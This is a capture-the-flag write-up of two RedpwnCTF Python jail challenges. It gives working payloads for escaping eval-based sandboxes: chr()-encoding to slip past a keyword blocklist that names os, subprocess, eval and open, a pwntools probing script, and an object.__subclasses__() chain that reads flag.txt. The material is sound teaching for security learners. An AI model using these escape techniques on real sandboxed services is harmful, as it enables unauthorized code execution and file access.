---
title: RedpwnCTF - Exploiting python eval to escape pyjails
description: Writeup for 2 pyjails challenges exploiting eval function.
categories: python, pyjail
author: Xh4H
tags: python ctf redpwnctf pyjail
---

# Introduction
Welcome to this post. I will show how I solved all the python jails challenges (pyjail) from RedpwnCTF.

## genericpyjail

**Challenge description**

When has a blacklist of insecure keywords EVER failed?

nc chall2.2019.redpwn.net 6006

blacklist.txt
```
import
ast
eval
=
pickle
os
subprocess
i love blacklisting words!
input
sys
windows users
print
execfile
hungrybox
builtins
open
most of these are in here just to confuse you
_
dict
[
>
<
:
;
]
exec
hah almost forgot that one
for
@
dir
yah have fun
file
```

**Ready, set, eval!**

Let's test it, ``nc`` to that address.

<div style="text-align:center"><img src="/assets/images/pyjail1.png" /></div>

We are told theres a file called flag.txt. If we try to run ``open`` function it will not work since it is present in the blacklist.

When we send our input, it first gets checked with that blacklist, and if it passed all the checks, it gets evaluated.

After a lot of trial and error, i ended up converting ``int(open("flag.txt", "r").read())`` to the ascii code of each character. Then used chr(number) to convert each ascii code back to the original character. Char by char i built back my initial payload without it being directly present in my input.

```py
chr(105) + chr(110) + chr(116) + chr(40) + chr(111) + chr(112) + chr(101) + chr(110) + chr(40) + chr(39) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116) + chr(39) + chr(44) + chr(32) + chr(39) + chr(114) + chr(39) + chr(41) + chr(46) + chr(114) + chr(101) + chr(97) + chr(100) + chr(40) + chr(41) + chr(41)
``` 

<div style="text-align:center"><img src="/assets/images/pyjail2.png" /></div>

Time to send this to the jail!

<div style="text-align:center"><img src="/assets/images/pyjail3.png" /></div>

Please note how I added the int function in order to make it throw an exception containing the flag. I analyzed this technique in my other post called [Python - Hacking with style - input](https://posts.xh4h.com/python/2019/08/03/input_magic.html).

**flag**: flag{bl4ckl1sts_w0rk_gre3344T!}

## genericpyjail2

**Challenge description**

how unoriginal do you have to be to make two of these

nc chall2.2019.redpwn.net 6007

**Action**

We do not have a blacklist now, but we can't use whitespaces or tabs. And we have a very limited set of builtins. You may be asking how I knew that. I made the following script to analyze builtins:

```py
from pwn import *
import re

r = remote("chall2.2019.redpwn.net", 6007)
r.recvline() # wow! again, there's a file called flag.txt! insane!

def main():
	matches = []
	i = 0
	response = ""
	exc = ""
	while (exc.find("out of range") == -1):
		r.sendline("int(dir(__builtins__)[%d])" % i)
		i = i + 1
		response = r.recvline() # Now it's ...
		exc = r.recvline() # Exception ...
		module = re.search( r"'(\w+)'", exc, re.M|re.I)
		
		if module:
			matches.append(module.group(1))
			print "New match: %s at index %d" % (module.group(1), i)


	print "finished"

	print ", ".join(matches)

try:
	main()
except Exception as e:
	print e
```

This script establishes a connection and sends ``int(dir(__builtins__)[i])`` where ``i`` is a number from zero to infinity until the jail said we where out of range. I used ``dir`` function to list builtins and ``int`` to get the raw exception, again ^^.

The script would then output every single match, and once finished, it would display every single match comma separated. This was useful to know our environment.

<div style="text-align:center"><img src="/assets/images/pyjail4.png" /></div>

There was no interesting function here that would help me with reading files.

I decided to recover deleted functions, yes, that's possible.

Accessing sub-sub-sub-.... modules of an empty tuple ``()`` we can get interesting information. There's a post [here](https://www.floyd.ch/?p=584) that talks about this.

Empty tuples have ``object`` as base class which has a subclass called ``warnings.catch_warnings``, with this we can print to the console (remember that we can't send whitespaces).

This is found here:
```py
().__class__.__base__.__subclasses__()[59]().__module.__builtins__['print'] # returns a function, print
```

With the piece of code above we can print again all modules inside subclasses and we find the following information. 
```py
().__class__.__base__.__subclasses__()[59]()._module.__builtins__['print'](().__class__.__base__.__subclasses__())
```

<div style="text-align:center"><img src="/assets/images/pyjail6.png" /></div>

There is a module of ``type file``. ``open`` function pretty much gets reduced to file, therefore we can read a file with it. It is located in the index 40.

```py
int(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())
```

Here, again, I used the int() exception :D.

<div style="text-align:center"><img src="/assets/images/pyjail5.png" /></div>

## Notes
### Notes for genericpyjail1
Instead of building a long chain of chr(number), it could have been solved as well by sending a base64 encoded string and decoding it on the fly: ``"base64payload".decode('base64')``.


### Notes for genericpyjail2
Appart from having used ``().__class__.__base__.__subclasses__()[59]()._module.__builtins__['print']`` to print, we could have used one from the builtins we saw, ``raw_input``, by having passed as parameter ``().__class__.__base__.__subclasses__()``. Remember I analyzed this in the post [mentioned earlier](https://posts.xh4h.com/python/2019/08/03/input_magic.html).

<div style="text-align:center"><img src="/assets/images/pyjail7.png" /></div>
Thanks for reading :)

<script src="https://www.hackthebox.eu/badge/21439"></script>
